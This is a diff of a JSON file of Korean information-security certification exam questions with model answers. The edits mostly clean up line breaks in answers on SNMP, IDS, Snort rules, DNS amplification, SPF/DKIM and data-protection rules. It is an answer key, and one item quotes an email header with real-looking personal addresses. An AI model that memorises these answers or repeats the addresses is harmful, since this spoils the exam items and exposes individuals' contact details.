@@ -4,7 +4,7 @@
       "original_id": 5,
       "type": "practical",
       "question": "SNMP 서비스 사용 시 적용되어야 하는 보안 설정 4 가지를 설명하시오.",
-      "answer": "1) 커뮤니티 스트링을 default 값이 아닌 유추하기 어려운 값으로 변경한다. \r  \r 2) 암호화가 지원되는 SNMP 버전 3 을 사용한다. \r  \r 3) ACL 을 적용하여 SNMP 를 이용할 수 있는 호스트를 제한한다. \r  \r 4) RW(Read-Write)모드는 삭제하고 가급적 RO(Read-Only)모드를 사용한다.",
+      "answer": "1) 커뮤니티 스트링을 default 값이 아닌 유추하기 어려운 값으로 변경한다.\n\n2) 암호화가 지원되는 SNMP 버전 3 을 사용한다.\n\n3) ACL 을 적용하여 SNMP 를 이용할 수 있는 호스트를 제한한다.\n\n4) RW(Read-Write)모드는 삭제하고 가급적 RO(Read-Only)모드를 사용한다.",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 301
@@ -13,7 +13,7 @@
       "original_id": 6,
       "type": "practical",
       "question": "TCP 헤더에 포함되어 있는 6 비트의 Flag 에 대한 설명이다. ( ) 에 적절한 설명을 기술하시오.\n[보기]\nURG : 긴급하게 전송할 데이터가 있는 경우 사용하며, 순서에 상관없이 우선순위를 높여 처리됨 PSH : 버퍼링된 데이터를 버퍼가 찰 때까지 기다리지 않고 수신 즉시 애플리케이션 계층으로 전달 SYN : ( A ) ACK : ( B ) FIN : ( C ) RST : ( D )",
-      "answer": "1) 최초 연결 수립을 요청하고, 순서 번호를 동기화할 때 사용됨 \r  \r 2) 상대로부터 패킷을 받았다는 것을 알려주며, 일반적으로 받은 시퀀스 번호에 +1 하여 \r 응답을 보냄 \r  \r 3) 송신 장비가 연결 종료를 요청 시 사용 \r  \r 4) 연결 상의 문제가 발생한 비정상 세션을 강제로 끊을 때 사용 \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "1) 최초 연결 수립을 요청하고, 순서 번호를 동기화할 때 사용됨\n\n2) 상대로부터 패킷을 받았다는 것을 알려주며, 일반적으로 받은 시퀀스 번호에 +1 하여 응답을 보냄\n\n3) 송신 장비가 연결 종료를 요청 시 사용\n\n4) 연결 상의 문제가 발생한 비정상 세션을 강제로 끊을 때 사용\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 302
@@ -22,7 +22,7 @@
       "original_id": 12,
       "type": "practical",
       "question": "BYOD 환경에서 모바일 오피스 서비스를 하려고 한다. 관련된 다음의 3 가지 보안 기술에 대하여 설명하시오.\n1) MDM(Mobile Device Management)\n2) 컨테이너화\n3) 모바일 가상화",
-      "answer": "1) MDM : 모바일 기기를 도난, 분실, 악용 등으로부터 보호하기 위하여 강화된 보안 \r 정책(인증, 앱 화이트 리스트, 원격 삭제, 탈옥 탐지, 스크린 캡처 방지, 카메라 제어 \r 등)을 적용하여 관리하기 위한 기술 \r  \r 2) 컨테이너화 : 하나의 모바일 기기 내에 업무용과 개인용 영역을 컨테이너라는 별도의 \r 공간으로 분리하여 프라이버시를 보호하기 위한 기술 \r  \r 3) 모바일 가상화 : 가상화 기술을 이용하여 하나의 모바일 기기에서 개인용 OS 영역과 \r 업무용 OS 영역을 완전히 분리하는 기술. 평상시에는 개인용 OS 영역에서 모바일 기기를 \r 이용하다가, 필요시 업무용 OS 로 전환하여 사용.",
+      "answer": "1) MDM : 모바일 기기를 도난, 분실, 악용 등으로부터 보호하기 위하여 강화된 보안 정책(인증, 앱 화이트 리스트, 원격 삭제, 탈옥 탐지, 스크린 캡처 방지, 카메라 제어 등)을 적용하여 관리하기 위한 기술\n\n2) 컨테이너화 : 하나의 모바일 기기 내에 업무용과 개인용 영역을 컨테이너라는 별도의 공간으로 분리하여 프라이버시를 보호하기 위한 기술\n\n3) 모바일 가상화 : 가상화 기술을 이용하여 하나의 모바일 기기에서 개인용 OS 영역과 업무용 OS 영역을 완전히 분리하는 기술. 평상시에는 개인용 OS 영역에서 모바일 기기를 이용하다가, 필요시 업무용 OS 로 전환하여 사용.",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 308
@@ -31,7 +31,7 @@
       "original_id": 17,
       "type": "practical",
       "question": "개인 정보의 안전성 확보조치 기준에서 요구하고 있는 보호 조치 5 가지를 기술하시오.",
-      "answer": "1) 접근통제 \r • \r 개인정보처리시스템에 대한 접속 권한을 인터넷 프로토콜(IP) 주소 등으로 제한하여 \r 인가받지 않은 접근을 제한 \r • \r 개인정보처리시스템에 접속한 인터넷 프로토콜(IP) 주소 등을 분석하여 개인정보 \r 유출 시도 탐지 및 대응 \r  \r 2) 접속기록의 위/변조 방지 \r • \r 개인정보취급자가 개인정보처리시스템에 접속한 기록 월 1 회 점검, 6 개월 이상 \r 접속기록 보존 \r • \r 접속 기록 위변조 방지를 위해 정기적인 백업 수행 \r  \r 3) 개인정보의 암호화  \r • \r 개인정보처리자는 비밀번호, 생체인식정보 등 인증정보를 저장 또는 정보통신망을 \r 통하여 송ㆍ수신하는 경우에 이를 안전한 암호 알고리즘으로 암호화하여야 한다. \r 다만, 비밀번호를 저장하는 경우에는 복호화되지 아니하도록 일방향 암호화하여 \r 저장하여야 한다. \r • \r 개인정보처리자는 이용자의 개인정보(주민등록번호, 여권번호, 운전면허번호 등)에 \r 대해서는 안전한 암호 알고리즘으로 암호화하여 저장하여야 한다. \r  \r 4) 악성프로그램 등 방지 \r • \r 프로그램의 자동 업데이트 기능을 사용하거나, 정당한 사유가 없는 한 일 1 회 이상 \r 업데이트를 실시하는 등 최신의 상태로 유지  \r • \r 발견된 악성프로그램 등에 대해 삭제 등 대응 조치 \r  \r 5) 물리적 안전조치 \r • \r 개인정보처리자는 개인정보가 포함된 서류, 보조저장매체 등을 잠금장치가 있는 \r 안전한 장소에 보관하여야 한다.  \r • \r 개인정보처리자는 \r 개인정보가 \r 포함된 \r 보조저장매체의 \r 반출ㆍ입 \r 통제를 \r 위한 \r 보안대책을 마련하여야 한다. 다만, 별도의 개인정보처리시스템을 운영하지 아니하고 \r 업무용 컴퓨터 또는 모바일 기기를 이용하여 개인정보를 처리하는 경우에는 이를 \r 적용하지 아니할 수 있다.  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "1) 접근통제 • 개인정보처리시스템에 대한 접속 권한을 인터넷 프로토콜(IP) 주소 등으로 제한하여 인가받지 않은 접근을 제한 • 개인정보처리시스템에 접속한 인터넷 프로토콜(IP) 주소 등을 분석하여 개인정보 유출 시도 탐지 및 대응\n\n2) 접속기록의 위/변조 방지 • 개인정보취급자가 개인정보처리시스템에 접속한 기록 월 1 회 점검, 6 개월 이상 접속기록 보존 • 접속 기록 위변조 방지를 위해 정기적인 백업 수행\n\n3) 개인정보의 암호화 • 개인정보처리자는 비밀번호, 생체인식정보 등 인증정보를 저장 또는 정보통신망을 통하여 송ㆍ수신하는 경우에 이를 안전한 암호 알고리즘으로 암호화하여야 한다.\n다만, 비밀번호를 저장하는 경우에는 복호화되지 아니하도록 일방향 암호화하여 저장하여야 한다.\n• 개인정보처리자는 이용자의 개인정보(주민등록번호, 여권번호, 운전면허번호 등)에 대해서는 안전한 암호 알고리즘으로 암호화하여 저장하여야 한다.\n\n4) 악성프로그램 등 방지 • 프로그램의 자동 업데이트 기능을 사용하거나, 정당한 사유가 없는 한 일 1 회 이상 업데이트를 실시하는 등 최신의 상태로 유지 • 발견된 악성프로그램 등에 대해 삭제 등 대응 조치\n\n5) 물리적 안전조치 • 개인정보처리자는 개인정보가 포함된 서류, 보조저장매체 등을 잠금장치가 있는 안전한 장소에 보관하여야 한다.\n• 개인정보처리자는 개인정보가 포함된 보조저장매체의 반출ㆍ입 통제를 위한 보안대책을 마련하여야 한다. 다만, 별도의 개인정보처리시스템을 운영하지 아니하고 업무용 컴퓨터 또는 모바일 기기를 이용하여 개인정보를 처리하는 경우에는 이를 적용하지 아니할 수 있다.\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 313
@@ -40,7 +40,7 @@
       "original_id": 18,
       "type": "practical",
       "question": "IDS 에서 사용하는 침입탐지 방식에 대하여 다음 물음에 답하시오.\n1) 오용 탐지의 정의\n2) 이상 탐지의 정의\n3) 오용 탐지의 장점\n4) 오용 탐지의 단점",
-      "answer": "1) 잘 알려져 있는 공격(오용, misuse) 패턴을 룰로 등록 후, 패턴(시그니처)과 \r 일치여부를 비교하여 침입 여부를 판단하는 방식  \r  \r 2) 정상 행위와 이상 행위(anomaly)를 프로파일링 후, 통계적 분석을 통하여 침입여부를 \r 판단하는 방식 \r  \r 3) 등록된 공격패턴에 의하여 탐지되므로 오탐률이 낮음 \r  \r 4) 패턴에 없는 새로운 공격은 탐지가 불가하며, 새로운 공격 탐지를 위하여 지속적으로 \r 패턴 업데이트를 해야 함.",
+      "answer": "1) 잘 알려져 있는 공격(오용, misuse) 패턴을 룰로 등록 후, 패턴(시그니처)과 일치여부를 비교하여 침입 여부를 판단하는 방식\n\n2) 정상 행위와 이상 행위(anomaly)를 프로파일링 후, 통계적 분석을 통하여 침입여부를 판단하는 방식\n\n3) 등록된 공격패턴에 의하여 탐지되므로 오탐률이 낮음\n\n4) 패턴에 없는 새로운 공격은 탐지가 불가하며, 새로운 공격 탐지를 위하여 지속적으로 패턴 업데이트를 해야 함.",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 314
@@ -49,7 +49,7 @@
       "original_id": 23,
       "type": "practical",
       "question": "스위칭 허브의 기능 및 동작 원리에 대하여 서술하시오.",
-      "answer": "1. 스위칭 허브의 기능 : 패킷의 목적지 주소(MAC, IP, Port 등)를 확인하여, 목적지가 \r 연결된 스위치의 포트로만 패킷을 전송하는 장치로 패킷의 고속 전송, 로드 밸런싱, QoS \r 기능을 수행",
+      "answer": "1. 스위칭 허브의 기능 : 패킷의 목적지 주소(MAC, IP, Port 등)를 확인하여, 목적지가 연결된 스위치의 포트로만 패킷을 전송하는 장치로 패킷의 고속 전송, 로드 밸런싱, QoS 기능을 수행",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 319
@@ -57,8 +57,8 @@
     {
       "original_id": 30,
       "type": "practical",
-      "question": "파일 업로드 취약점 대응을 위한 .htaccess 파일 설정의 의미에 대하여 답하시오.\n1) <FilesMatch \\.(ph|lib|sh|) Order Allow DENY Deny From ALL\n[보기]\n</FilesMatch>\n2) AddType text/html .php .php1.php2.php3 .php4 .phtml",
-      "answer": "1) FilesMatch 지시자를 이용, .ph, .lib, .sh 등의 Server Side Script 파일에 대해서 직접 \r URL 호출 금지 (업로드된 스크립트(웹쉘)의 실행을 방지하기 위한 목적임) \r  \r 2) AddType 지시자를 이용 Server Side Script 확장자를 실행불가한 text/html MIME \r Type 으로 재조정하여 업로드된 스크립트 실행 방지 \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "question": "파일 업로드 취약점 대응을 위한 .htaccess 파일 설정의 의미에 대하여 답하시오.\n1) <FilesMatch \\.(ph|lib|sh|) Order Allow DENY Deny From ALL\n</FilesMatch>\n2) AddType text/html .php .php1.php2.php3 .php4 .phtml",
+      "answer": "1) FilesMatch 지시자를 이용, .ph, .lib, .sh 등의 Server Side Script 파일에 대해서 직접 URL 호출 금지 (업로드된 스크립트(웹쉘)의 실행을 방지하기 위한 목적임)\n\n2) AddType 지시자를 이용 Server Side Script 확장자를 실행불가한 text/html MIME Type 으로 재조정하여 업로드된 스크립트 실행 방지\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 326
@@ -66,8 +66,8 @@
     {
       "original_id": 35,
       "type": "practical",
-      "question": "특정 공격과 관련된 로그를 보고 다음 물음에 답하시오.\n[보기]\n[로그] DNS standard query 0x2872 ANY cpsc.gov United states Korea, Republic of DNS standard query 0x2872 ANY cpsc.gov United states Korea, Republic of DNS standard query 0x2872 ANY cpsc.gov United states Korea, Republic of DNS standard query 0x2872 ANY cpsc.gov United states Korea, Republic of\n\n1) 어떤 공격이 수행된 것인가?\n2) 해당 공격이 수행된 것으로 판단한 이유는?\n3) 해당 공격의 원리는?\n4) 공격자들이 이 기법을 사용하는 이유 두 가지는?",
-      "answer": "1) DNS 증폭 DRDoS 공격(DNS amplifcation DRDoS attack) \r  \r 2) DNS query 수행 시 ANY 타입으로 질의를 다수 수행하였음.  \r  \r 3) 출발지 IP 를 공격 대상 서버의 IP 로 위조 후 DNS 쿼리 타입을 ANY 로 지정하여 \r request 를 대량으로 수행하면, 다양한 TYPE 의 레코드들이 모두 Response 되므로 \r 응답이 증폭되어 공격 대상 서버에 부하를 주게 됨 \r  \r 4-1) 출발지 IP\r 가 위조되고, 반사 서버를 통해 공격이 수행되므로 공격의 출처를 \r 파악하기 어려움. 특히 UDP 는 별도의 인증 절차가 없으므로 공격 수행이 용이함 \r 4-2) 다수의 좀비 PC 를 동원하지 않더라도 대량의 공격 패킷을 만들어 낼 수 있어 \r 효율이 높음. 특히 쿼리 타입을 any 나 txt 로 하면 reponse 사이즈가 증폭되어 작은 \r 사이즈의 DNS 질의에 대해 큰 사이즈의 DNS 응답 메시지 발생되어 증폭 효과가 큼. \r 90 바이트 질의, 3370 바이트 응답(37.4 배 증폭 효과) \r  \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "question": "특정 공격과 관련된 로그를 보고 다음 물음에 답하시오.\n[보기]\n[로그]\nDNS standard query 0x2872 ANY cpsc.gov United states Korea, Republic of DNS standard query 0x2872 ANY cpsc.gov United states Korea, Republic of DNS standard query 0x2872 ANY cpsc.gov United states Korea, Republic of DNS standard query 0x2872 ANY cpsc.gov United states Korea, Republic of\n\n1) 어떤 공격이 수행된 것인가?\n2) 해당 공격이 수행된 것으로 판단한 이유는?\n3) 해당 공격의 원리는?\n4) 공격자들이 이 기법을 사용하는 이유 두 가지는?",
+      "answer": "1) DNS 증폭 DRDoS 공격(DNS amplifcation DRDoS attack)\n\n2) DNS query 수행 시 ANY 타입으로 질의를 다수 수행하였음.\n\n3) 출발지 IP 를 공격 대상 서버의 IP 로 위조 후 DNS 쿼리 타입을 ANY 로 지정하여 request 를 대량으로 수행하면, 다양한 TYPE 의 레코드들이 모두 Response 되므로 응답이 증폭되어 공격 대상 서버에 부하를 주게 됨\n\n4-1) 출발지 IP 가 위조되고, 반사 서버를 통해 공격이 수행되므로 공격의 출처를 파악하기 어려움. 특히 UDP 는 별도의 인증 절차가 없으므로 공격 수행이 용이함 4-2) 다수의 좀비 PC 를 동원하지 않더라도 대량의 공격 패킷을 만들어 낼 수 있어 효율이 높음. 특히 쿼리 타입을 any 나 txt 로 하면 reponse 사이즈가 증폭되어 작은 사이즈의 DNS 질의에 대해 큰 사이즈의 DNS 응답 메시지 발생되어 증폭 효과가 큼.\n90 바이트 질의, 3370 바이트 응답(37.4 배 증폭 효과)\n\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 331
@@ -75,8 +75,8 @@
     {
       "original_id": 36,
       "type": "practical",
-      "question": "다음은 email 관련 로그이다. 이에 대하여 다음 물음에 답하시오.\n[보기]\n[Email 로그] 1 Delivered-To: hbiden@rosemontseneca.com 2 Received: by 10.36.47.149 with SMTP id j143csp13601itj;\n3 Fri, 17 Apr 2015 06:00:53 -0700 (PDT) 4 X-Received: by 10.55.27.42 with SMTP id b42mr5166039qkb.53.1429275653296;\n5 Fri, 17 Apr 2015 06:00:53 -0700 (PDT) 6 Return-Path: <v.pozharskyi.ukraine@gmail.com>\n7 Received:\nfrom mail-qc0-x232.google.com (mail-qc0-x232.google.com.\n[2607:f8b0:400d:c01::232]) 8 by mx.google.com with ESMTPS id u123si11512941qhd.83.2015.04.17.06.00.52 9 for <hbiden@rosemontseneca.com>\n10 (version=TLSv1.2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128);\n11 Fri, 17 Apr 2015 06:00:53 -0700 (PDT) 12 Received-SPF: pass (google.com: domain of v.pozharskyi.ukraine@gmail.com designates 2607:f8b0:400d:c01::232 as permitted sender) client- ip=2607:f8b0:400d:c01::232;\n13 Authentication-Results: mx.google.com;\n14 spf=pass (google.com: domain of v.pozharskyi.ukraine@gmail.com designates 2607:f8b0:400d:c01::232 as permitted sender) smtp.mail=v.pozharskyi.ukraine@gmail.com;\n15 dkim=pass header.i=@gmail.com;\n\n1) 10 번째 줄에서 RSA 의 용도는?\n2) 이메일 로그에서 확인할 수 있는 스팸메일 대응 기법명과 동작원리를 설명하시오.",
-      "answer": "1) 인증서(서버 공개키) 검증을 위하여 사용됨. 즉, TLS 로 암호화통신을 하기 위하여 \r ECDHE\r 로 키교환을 하는 과정에서 생성되는 변수를 송신자의 개인키로 서명하고 \r 공개키로 검증하도록 함으로서 송신자의 정당성을 인증하기 위함. 이를 통하여 키교환 \r 과정에서의 중간자 공격을 막을 수 있음.  \r  \r 2-1) SPF : 이메일 발송도메인의 DNS 에 txt 레코드로 등록된 IP 주소와 실제 메일의 송신 \r IP 를 비교하여 메일 도메인의 정당성을 검증 \r 2-2) DKIM : 이메일 서버의 개인키로 이메일 헤더를 전자서명하고, 메일 도메인서버의 \r txt 레코드로 등록된 공개키로 검증하도록 함으로써, 메일 헤더가 변조되지 않았고 실제 \r 해당 도메인에서 발송된 것을 확인 가능 \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "question": "다음은 email 관련 로그이다. 이에 대하여 다음 물음에 답하시오.\n[보기]\n[Email 로그]\n1 Delivered-To: hbiden@rosemontseneca.com 2 Received: by 10.36.47.149 with SMTP id j143csp13601itj;\n3 Fri, 17 Apr 2015 06:00:53 -0700 (PDT) 4 X-Received: by 10.55.27.42 with SMTP id b42mr5166039qkb.53.1429275653296;\n5 Fri, 17 Apr 2015 06:00:53 -0700 (PDT) 6 Return-Path: <v.pozharskyi.ukraine@gmail.com>\n7 Received:\nfrom mail-qc0-x232.google.com (mail-qc0-x232.google.com.\n[2607:f8b0:400d:c01::232])\n8 by mx.google.com with ESMTPS id u123si11512941qhd.83.2015.04.17.06.00.52 9 for <hbiden@rosemontseneca.com>\n10 (version=TLSv1.2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128);\n11 Fri, 17 Apr 2015 06:00:53 -0700 (PDT) 12 Received-SPF: pass (google.com: domain of v.pozharskyi.ukraine@gmail.com designates 2607:f8b0:400d:c01::232 as permitted sender) client- ip=2607:f8b0:400d:c01::232;\n13 Authentication-Results: mx.google.com;\n14 spf=pass (google.com: domain of v.pozharskyi.ukraine@gmail.com designates 2607:f8b0:400d:c01::232 as permitted sender) smtp.mail=v.pozharskyi.ukraine@gmail.com;\n15 dkim=pass header.i=@gmail.com;\n\n1) 10 번째 줄에서 RSA 의 용도는?\n2) 이메일 로그에서 확인할 수 있는 스팸메일 대응 기법명과 동작원리를 설명하시오.",
+      "answer": "1) 인증서(서버 공개키) 검증을 위하여 사용됨. 즉, TLS 로 암호화통신을 하기 위하여 ECDHE 로 키교환을 하는 과정에서 생성되는 변수를 송신자의 개인키로 서명하고 공개키로 검증하도록 함으로서 송신자의 정당성을 인증하기 위함. 이를 통하여 키교환 과정에서의 중간자 공격을 막을 수 있음.\n\n2-1) SPF : 이메일 발송도메인의 DNS 에 txt 레코드로 등록된 IP 주소와 실제 메일의 송신 IP 를 비교하여 메일 도메인의 정당성을 검증 2-2) DKIM : 이메일 서버의 개인키로 이메일 헤더를 전자서명하고, 메일 도메인서버의 txt 레코드로 등록된 공개키로 검증하도록 함으로써, 메일 헤더가 변조되지 않았고 실제 해당 도메인에서 발송된 것을 확인 가능\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 332
@@ -84,8 +84,8 @@
     {
       "original_id": 41,
       "type": "practical",
-      "question": "다음 Snort 룰에 대하여 각 정책의 의미를 설명하시오.\n[보기]\n[Snort Rule] Alert any anry\n->\nany 80 (msg:\"GET Flooding\";content:\"GET /HTTP1.\";content:\"USER\";content:!\"anonymous\";content:\"|00|\";depth:1;nocase;sid:1 ;)\n1) msg: \"GET Flooding\" 의 의미는?\n2) content: \"GET /HTTP1.\" 의 의미는?\n3) content:\"USER\";content:!\"anonymous\" 의 의미는?\n4) content:\"|00|\";depth:1 의 의미는?",
-      "answer": "1) 설정된 2)~4)의 탐지 정책에 모두 일치하는 경우 로그에 \"Get Flooding”으로 기록 \r  \r 2) HTTP request 에 \"GET /HTTP1.\" 문자열이 포함되어 있는지 검사 \r  \r 3) \r 2)번이 \r 끝난 \r 위치에서 \r \"USER\" \r 문자열이 \r 포함되어 \r 있고, \r 그 \r 뒤에 \r 바로 \r \"anonymous\"가 포함되지 않은 문자열 검사 \r  \r 4) 3)번이 끝난 위치에서 1 바이트를 확인하여 바이너리 값 00 이 포함되어 있는지 검사 \r  \r  \r  \r  \r  \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "question": "다음 Snort 룰에 대하여 각 정책의 의미를 설명하시오.\n[보기]\n[Snort Rule]\nAlert any anry\n->\nany 80 (msg:\"GET Flooding\";content:\"GET /HTTP1.\";content:\"USER\";content:!\"anonymous\";content:\"|00|\";depth:1;nocase;sid:1 ;)\n1) msg: \"GET Flooding\" 의 의미는?\n2) content: \"GET /HTTP1.\" 의 의미는?\n3) content:\"USER\";content:!\"anonymous\" 의 의미는?\n4) content:\"|00|\";depth:1 의 의미는?",
+      "answer": "1) 설정된 2)~4)의 탐지 정책에 모두 일치하는 경우 로그에 \"Get Flooding”으로 기록\n\n2) HTTP request 에 \"GET /HTTP1.\" 문자열이 포함되어 있는지 검사\n\n3)\n2)번이 끝난 위치에서 \"USER\" 문자열이 포함되어 있고, 그 뒤에 바로 \"anonymous\"가 포함되지 않은 문자열 검사\n\n4) 3)번이 끝난 위치에서 1 바이트를 확인하여 바이너리 값 00 이 포함되어 있는지 검사\n\n\n\n\n\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 337
@@ -94,7 +94,7 @@
       "original_id": 42,
       "type": "practical",
       "question": "쿠키에 설정되는 보안 기능과 관련하여 다음 각 물음에 답하시오.\n(1) Secure 속성의 기능\n(2) Secure 속성으로 대응 가능한 공격\n(3) HttpOnly 속성 설정 시 쿠키 값\n(4) HttpOnly 속성의 기능\n(5) HttpOnly 속성으로 대응 가능한 공격",
-      "answer": "(1) Secure 통신(SSL/TLS)을 수행하는 경우에만 클라이언트에서 해당 쿠키 전송(쿠키의 \r 기밀성 보장) \r  \r (2) 스니핑 공격을 통한 쿠키 정보 탈취에 대응 가능 \r  \r (3) HttpOnly \r  \r (4) 웹브라우저에서 자바스크립트(document.cookie) 등을 통한 해당 쿠키 접근을 차단함 \r  \r (5) 쿠키 탈취를 위한 XSS(Cross Site Scripting) 공격에 대응 가능 \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "(1) Secure 통신(SSL/TLS)을 수행하는 경우에만 클라이언트에서 해당 쿠키 전송(쿠키의 기밀성 보장)\n\n(2) 스니핑 공격을 통한 쿠키 정보 탈취에 대응 가능\n\n(3) HttpOnly\n\n(4) 웹브라우저에서 자바스크립트(document.cookie) 등을 통한 해당 쿠키 접근을 차단함\n\n(5) 쿠키 탈취를 위한 XSS(Cross Site Scripting) 공격에 대응 가능\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 338
@@ -102,8 +102,8 @@
     {
       "original_id": 47,
       "type": "practical",
-      "question": "정보보호 위험평가 관련하여 다음 물음에 답하시오.\n1) 2 가지(A,B) 정보보호 대책 적용 시 위험 평가 결과표의 빈칸을 채우시오.\n[보기]\n[A 적용시]\n- AV(자산가치) = 100,000, EF(노출계수) = 0.2\n- ARO (연간 발생 빈도) = 0.5\n- SLE = ( 1 )\n- ALE = ( 3 )\n- 보호대책적용으로 감소한 ALE = 30,000\n- 정보보호대책 운영 비용 : 17,000\n- 정보보호대책 효과(가치) = ( 5 )\n[B 적용시]\n- AV(자산가치) = 100,000, EF(노출계수) = 0.8\n- SLE = ( 2 )\n- ALE = ( 4 )\n- ARO (연간 발생 빈도) = 0.25\n- 보호대책적용으로 감소한 ALE = 20,000\n- 정보보호대책 운영 비용 : 4,000\n- 정보보호대책 효과(가치) = ( 6 )\n\n2) 위험 평가 결과를 참고하여, 2 가지 정보보호 대책 중 적절한 대책을 선정하고, 선정 사유를 설명하시오.",
-      "answer": "1) 계산 결과  \r (1) 20,000 : AV(100,000) * EF(0.2)  \r (2) 80,000 : AV(100,000) * EF(0.8) \r (3) 10,000 : SLE(20,000) * ARO(0.5) \r (4) 20,000 : SLE(80,000) * ARO(0.25) \r (5) 13,000 : 감소한 ALE(30,000) - 보호대책 운영 비용(17,000)  \r (6) 16,000 : 감소한 ALE(20,000) - 보호대책 운영 비용(4,000) \r  \r 2) B 가 상대적으로 효과적인 보호 대책임. 정보보호대책의 효과는 보호대책 적용에 따라 \r 감소한 ALE(적용전 ALE - 적용후 ALE) 에서 보호 대책 운영 비용을 뺀 금액으로, +값이 \r 될수록 효과적이라고 볼 수 있음. B 의 효과가 16,000 으로 A 의 효과인 13,000 보다 \r 3,000 이 높기 때문에, B 를 선정하는 것이 타당함. \r   \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "question": "정보보호 위험평가 관련하여 다음 물음에 답하시오.\n1) 2 가지(A,B) 정보보호 대책 적용 시 위험 평가 결과표의 빈칸을 채우시오.\n[A 적용시]\n- AV(자산가치) = 100,000, EF(노출계수) = 0.2\n- ARO (연간 발생 빈도) = 0.5\n- SLE = ( 1 )\n- ALE = ( 3 )\n- 보호대책적용으로 감소한 ALE = 30,000\n- 정보보호대책 운영 비용 : 17,000\n- 정보보호대책 효과(가치) = ( 5 )\n[B 적용시]\n- AV(자산가치) = 100,000, EF(노출계수) = 0.8\n- SLE = ( 2 )\n- ALE = ( 4 )\n- ARO (연간 발생 빈도) = 0.25\n- 보호대책적용으로 감소한 ALE = 20,000\n- 정보보호대책 운영 비용 : 4,000\n- 정보보호대책 효과(가치) = ( 6 )\n\n2) 위험 평가 결과를 참고하여, 2 가지 정보보호 대책 중 적절한 대책을 선정하고, 선정 사유를 설명하시오.",
+      "answer": "1) 계산 결과\n(1) 20,000 : AV(100,000) * EF(0.2)\n(2) 80,000 : AV(100,000) * EF(0.8)\n(3) 10,000 : SLE(20,000) * ARO(0.5)\n(4) 20,000 : SLE(80,000) * ARO(0.25)\n(5) 13,000 : 감소한 ALE(30,000) - 보호대책 운영 비용(17,000)\n(6) 16,000 : 감소한 ALE(20,000) - 보호대책 운영 비용(4,000)\n\n2) B 가 상대적으로 효과적인 보호 대책임. 정보보호대책의 효과는 보호대책 적용에 따라 감소한 ALE(적용전 ALE - 적용후 ALE) 에서 보호 대책 운영 비용을 뺀 금액으로, +값이 될수록 효과적이라고 볼 수 있음. B 의 효과가 16,000 으로 A 의 효과인 13,000 보다 3,000 이 높기 때문에, B 를 선정하는 것이 타당함.\n\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 343
@@ -112,7 +112,7 @@
       "original_id": 48,
       "type": "practical",
       "question": "공공기관의 개인정보흐름표에서 문제가 되는 사항 4 가지를 찾아서 설명하시오.\n[보기]\n[개인정보 흐름표 주요 내용]\n1) 수집\n- 수집항목 : 성명, 주민등록번호, 전화번호, 이메일\n- 주민등록번호 수집 근거 : 정보주체의 동의\n2) 저장\n- 저장항목 : 성명, 주민등록번호, 전화번호, 이메일\n- 암호화항목 : 주민등록번호\n- 암호화알고리즘 : MD5\n3) 제공 및 파기\n- 제공항목 : 주민등록번호\n- 제공방법 : DB 실시간 연동\n- 암호화적용여부 : 평문전송\n- 파기주기 : 영구보관",
-      "answer": "1) 주민등록번호 수집 근거 법령이 명시되어 있지 않고, 단순히 정보주체의 동의만 \r 언급되어 있음. \r  \r 2) 비밀번호 암호화에 안전하지 않은 알고리즘 사용(SHA2 이상 필요) \r  \r 3) 주민번호 제3 자 전송 시 평문으로 전송(암호화 전송 필요) \r  \r 4) 개인정보 영구 보관(파기 주기 명시 필요)",
+      "answer": "1) 주민등록번호 수집 근거 법령이 명시되어 있지 않고, 단순히 정보주체의 동의만 언급되어 있음.\n\n2) 비밀번호 암호화에 안전하지 않은 알고리즘 사용(SHA2 이상 필요)\n\n3) 주민번호 제3 자 전송 시 평문으로 전송(암호화 전송 필요)\n\n4) 개인정보 영구 보관(파기 주기 명시 필요)",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 344
@@ -121,7 +121,7 @@
       "original_id": 53,
       "type": "practical",
